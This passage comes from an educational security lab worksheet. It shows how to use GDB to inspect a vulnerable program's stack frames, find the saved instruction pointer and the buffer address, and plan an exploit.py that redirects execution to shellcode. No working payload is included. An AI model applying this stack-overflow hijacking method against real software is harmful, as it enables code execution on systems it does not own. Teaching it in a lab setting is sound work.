(e.g. **r**ead, **w**rite and e**x**ecute) in the second column.
In the output above, the actual program instructions of `stack-L1-dbg` -- the "text segment" --
are in the addresses `0x56555000` to `0x5655a000` (lines 1--3). Back in GDB, if you
ask for the memory address of the instructions of the `main` routine,
you should get an address in that range:

[^mem-seg]: The man page for [proc](https://linux.die.net/man/5/proc) explains
  the format of the listing -- search within the man page for the text "`/proc/[pid]/maps`"
  to locate the relevant documentation. <span style="display: block; height: 0.5rem;"><br></span>
  Most of the permissions ("r", "w" and "x") should be self-explanatory. For our purposes,
  you don't need to know that the "p" means. (But if you're interested -- it indicates a
  [copy-on-write](https://en.wikipedia.org/wiki/Copy-on-write) memory segment.)

```
(gdb) print main
$1 = {int (int, char **)} 0x565562e0 <main>
```

The *stack* is in the range of addresses from `0xfffdd000` to
`0xffffe000`.

For convenience, GDB also provides another way of getting the same information.  The GDB
"`info proc`" command extracts information from the `/proc` filesystem automatically in much
the same way we just did manually. Typing `help info proc` tells you more about the command:

```
(gdb) help info proc
Show /proc process information about any running process.
Specify any process id, or use the program being debugged by default.
Specify any of the following keywords for detailed info:
  mappings -- list of mapped memory regions.
  stat     -- list a bunch of random process info.
  status   -- list a different bunch of random process info.
  all      -- list all available /proc info.
```

And typing `info proc mappings` should display output similar to what we got from the
`<code>cat /proc/<em>process_id</em>/maps</code>`{=html} command.

</div>

A good way to start is to open the vulnerable program in GDB, put a breakpoint within
the `bof` function, and then run the program.
If we're stopped somewhere in the `bof` function, then if we issue the
`backtrace` command, we can get some basic information about the stack
frames currently on the stack:

```
(gdb) backtrace
#0  bof (str=0xffffd2e3 "\n\212\027\377\367\bRUV\001") at stack.c:17
#1  0x565563ee in dummy_function (str=0xffffd2e3 "\n\212\027\377\367\bRUV\001") at stack.c:46
#2  0x56556382 in main (argc=1, argv=0xffffd5a4) at stack.c:34
```

(If you see something very different -- make sure you're running GDB against
`stack-L1-dbg`, and not `stack-L1`. The latter program is missing the debug symbols that
have been inserted into `stack-L1-dbg`, and thus will be less easy to analyse using GDB.)

This says there are 3 stack frames on the stack. Stack frame #2
represents our position in the `main` function. We've just executed an
instruction sitting at location `0x56556382` in memory,[^main_line] which
corresponds to `stack.c` line 34 (i.e., the call to
`dummy_function(str)`).

[^main_line]: A little math tells us that (*location_in_main* $-$
  *start_of_main*) = $(0x56556382 - 0x565562e0)$ = 162; we're
  162 instructions past the start of the `main` function. If we
  wanted, we could view the precise assembly language instructions
  being executed, by issuing the GDB command `layout asm`.

Similarly, stack frame #1 represents our position in `dummy_function`,
and stack frame #0 is the current stack frame.

We can get more information about a stack frame using the `info frame`
command. For instance, issuing the GDB command `info frame 0` should
result in output like the following:

```
(gdb) info frame 0
Stack frame at 0xffffcec0:
 eip = 0x565562c2 in bof (stack.c:17); saved eip = 0x565563ee
 called by frame at 0xffffd2d0
 source language c.
 Arglist at 0xffffce3c, args: str=0xffffd2e3 "\n\212\027\377\367\bRUV\001"
 Locals at 0xffffce3c, Previous frame's sp is 0xffffcec0
 Saved registers:
  ebx at 0xffffceb4, ebp at 0xffffceb8, eip at 0xffffcebc
```

This tells us:

- Looking at the first line of output, `Stack frame at 0xffffcec0`:

  The current stack frame, for `bof`, is at location `0xffffcec0`. (The stack frames
  for `dummy_function` and `main`, if we inspect them, will be at higher addresses in memory.
  Recall that the stack grows from *high* memory addresses to *low*
  ones.)
- Looking at the second line of output, `eip = 0x565562c2 in bof
  (stack.c:17); saved eip = 0x565563ee`:

  This tells us about the value of the `eip` register. On Intel
  processors, this is the "Extended Instruction Pointer" register -- it
  keeps track of what instruction is currently being executed.

  `eip = 0x565562c2 in bof (stack.c:17)` tells us that we're currently
  executing the instruction at location `0x565562c2` in memory, and that it
  corresponds to `stack.c` line 17.

  `saved eip = 0x565563ee` tells us about the
  bit of the stack frame that says what code to execute after the
  current function returns. Presently, the stack frame is going to
  return to location `0x565563ee` -- the spot in `dummy_function`
  where we've just executed the call to `bof()`.

- Looking at the last line of output, `eip at 0xffffcebc`:

  This tells us the location we need to overwrite, if we want to jump
  to somewhere *other* than `dummy_function`.

  Memory location `0xffffcebc` is the part of the current stack frame
  which stores the "next instruction to execute" after `bof` returns.

Let's examine the Instruction Pointer a little. Make sure you're
stopped in the middle of the `bof` function: issue the GDB commands
`run` (this will ask you if you want to restart the program; answer yes)
and `next` to get there.

Issue the GDB command `print $eip` to show the current value of the
Instruction Pointer, and you should see something like the following:

```
(gdb) print $eip
$8 = (void (*)()) 0x565562c2 <bof+21>
```

What does this mean?

- `(void (*)())` says that we should think of the `eip` register
  as holding a pointer to a function taking no arguments and returning
  void.
- `0x565562c2` is the location in memory of the address currently
  being executed.
- `<bof+21>` says it's 21 instructions past the start of `bof`.
  (If you like, you can confirm this by issuing the GDB command `print
  bof` -- that will tell you where the *first* instruction in `bof`
  is located -- and checking that it's equal to *address_in_eip* $-$ 21.

Now let's do the same for the *saved* `eip`.

<div style="border: solid 2pt blue; background-color: hsla(241, 100%,50%, 0.1); padding: 1em; border-radius: 5pt; margin-top: 1em;">

::: block-caption

Convenience variables in GDB

:::

Sometimes while debugging in GDB, it's handy to be able to hang onto
some value because it will be useful to refer to it in a later step.

GDB lets us define *convenience variables* (see the GDB
documentation on them [here][gdb-conv-var]). These variables aren't part
of the program being debugged; they exist purely within GDB,
and have no effect on the execution of the program. They're more like a
piece of GDB-specific "scratch paper" on which you might write down notes
for later.

[gdb-conv-var]: https://sourceware.org/gdb/onlinedocs/gdb/Convenience-Vars.html

Convenience variables start with a dollar sign ("`$`"). You can *set* a
convenience variable with a command like:

```
(gdb) set $myvar = 0x2020
```

and thereafter use the variable in any GDB command. For instance, the
following will print the value of `$myvar`:

```
(gdb) print/x $myvar
$9 = 0x2020
```

(The "`/x`" after the "print" command instructs GDB to print the
result in hexadecimal notation, rather than decimal, and is useful for
printing the value of pointers.)


</div>

We know the saved `eip` is stored
in memory location `0xffffcebc`. Let's see where that *currently*
points. We'll use GDB's "convenience variables" to make our commands a
bit easier to read.

```
(gdb) set $saved_eip = 0xffffcebc
#     ^ store the location for later
(gdb) print (size_t *) $saved_eip
#     ^ we can tell GDB to treat $saved_eip as a pointer to size_t*
$10 = (size_t *) 0xffffcebc
(gdb) print/x (* ((size_t *) $saved_eip))
#     ^ now we *dereference* the $saved_eip location,
#       displaying (in hex) the address it holds.
$11 = 0x565563ee
```

We know it's okay to treat `$saved_eip` as a "pointer to `size_t`",
because a `size_t` is big enough to hold any address in memory.[^intptr]
GDB tells us that the current contents of `$saved_eip` is `0x565563ee` --
and that is indeed the address GDB has said we're going to jump back
to.

We can issue the command  `print (void (*)()) 0x565563ee` to confirm
where that address is -- GDB will tell us that it's the same as
`<dummy_function+62>`. (We cast it to the type "pointer to a function
taking no arguments and returning `void`", so that GDB knows to
interpret it as the address of executable code.)

[^intptr]: Technically, it would be more appropriate to treat `$saved_eip`
  as a "pointer to `intptr_t`" or as a "pointer to a function pointer" --
  but "`size_t`" is much easier to read.

So, we've confirmed that the saved `eip` register does says that
once the current function has finished executing, we're to jump
back into somewhere in `dummy_function` (specifically, the 62nd
instruction after the start of the function).

So, how can we overwrite the saved `eip`? We'll need to know

(a) where the `buffer[BUF_SIZE]` local variable is sitting in
    memory. This is where the contents of `badfile` will get written.
(b) how far past that location the saved `eip` is. If we adjust the
    contents of `badfile` carefully, we should be able to
    overwrite the saved `eip` with the address of some other function.

We can get item (a) by issuing the command `print &buffer`. The output
should be something like:

```
(gdb) print &buffer
$12 = (char (*)[100]) 0xffffce4c
```

So the address of the saved `eip`, minus the address of `buffer`, tells
us the spot in `badfile` that should contain the address of our
malicious shellcode.

To start with, you might want to focus on overwriting the saved `eip`
with a function of your choosing and get that working, before trying to
force execution of your shellcode.

For instance, can you overwrite the saved `eip` so that when the `bof`
function finishes, execution will -- instead of jumping to instruction
`<bof+21>` -- jump to the start of `bof` again, or the start of
`dummy_function`? In `exploit.py`, change the value of `ret` to the location
of the function you want to jump to, and change `offset` to the
distance between `buffer` and the saved `eip`. You can then use GDB to
step through execution of `stack-L1-dbg` and confirm whether this
worked.

Then, try to get your shellcode executed. In `exploit.py`,
change the value of `shellcode` so that it holds the shellcode
instructions to execute. You'll then need to decide where
in `buffer` your shellcode should be inserted (leaving it at 0 to start
with is fine); work out what the start address of your shellcode is
going to be;
and ensure that `ret` contains that address.



## Credits

The code for the programs in this lab is adapted from the
Set-UID lab at
<https://web.ecs.syr.edu/~wedu/seed/Labs/Set-UID/Set-UID.pdf>
and is copyright Wenliang Du, Syracuse University.

<!--

also

https://seedsecuritylabs.org/Labs_20.04/Files/Buffer_Overflow_Setuid/Buffer_Overflow_Setuid.pdf

-->

<br><br>




<!-- vim: syntax=markdown tw=92 :
-->
